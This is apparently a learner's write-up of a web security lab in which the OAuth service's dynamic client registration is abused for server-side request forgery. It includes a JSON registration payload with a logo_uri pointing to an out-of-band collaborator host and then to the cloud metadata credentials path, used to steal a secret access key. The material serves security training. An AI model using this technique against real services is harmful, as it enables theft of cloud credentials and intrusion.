# Practitioner Lab 143: SSRF via OpenID dynamic client registration

---

This lab allows client applications to dynamically register themselves with the [OAuth](https://portswigger.net/web-security/oauth) service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an [SSRF attack](https://portswigger.net/web-security/ssrf) to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: `wiener:peter`

![Untitled](Practitioner%20Lab%20143%20SSRF%20via%20OpenID%20dynamic%20clien%20191755657472432ca9fb3ec4f0b6f74c/Untitled.png)

Its using openId

![Untitled](Practitioner%20Lab%20143%20SSRF%20via%20OpenID%20dynamic%20clien%20191755657472432ca9fb3ec4f0b6f74c/Untitled%201.png)

i tried /register /connect/register /registration and when I decided to look at this it worked. 

```
"issuer":"https://oauth-0af9009a03e9f6dc87c2de0c02dd0074.oauth-server.net","jwks_uri":"https://oauth-0af9009a03e9f6dc87c2de0c02dd0074.oauth-server.net/jwks",

"registration_endpoint":"https://oauth-0af9009a03e9f6dc87c2de0c02dd0074.oauth-server.net/reg","response_modes_supported":["form_post","fragment","query"],"response_types_supported":["code"],
```

![Untitled](Practitioner%20Lab%20143%20SSRF%20via%20OpenID%20dynamic%20clien%20191755657472432ca9fb3ec4f0b6f74c/Untitled%202.png)

it says that only application/json bodies .

![Untitled](Practitioner%20Lab%20143%20SSRF%20via%20OpenID%20dynamic%20clien%20191755657472432ca9fb3ec4f0b6f74c/Untitled%203.png)

I managed to register.

```

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://lncs81r7qgmmqi9ob8nh79tz5qbhz9ny.oastify.com",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks"
}
```

I used this request to see if maybe I could get a collaborator dns request.

I then found this /client request which makes a request for the logo. 

Using this I tried to change the id to get the logo and see what happens.

![Untitled](Practitioner%20Lab%20143%20SSRF%20via%20OpenID%20dynamic%20clien%20191755657472432ca9fb3ec4f0b6f74c/Untitled%204.png)

After making a request here. I managed to get something on the collaborator. 

This means that this would perform some ssrf if I put the path.

![Untitled](Practitioner%20Lab%20143%20SSRF%20via%20OpenID%20dynamic%20clien%20191755657472432ca9fb3ec4f0b6f74c/Untitled%205.png)

Here I changed the path of the logo_uri for the one I want to get data from. 

![Untitled](Practitioner%20Lab%20143%20SSRF%20via%20OpenID%20dynamic%20clien%20191755657472432ca9fb3ec4f0b6f74c/Untitled%206.png)

This gave me the secretAccesskey.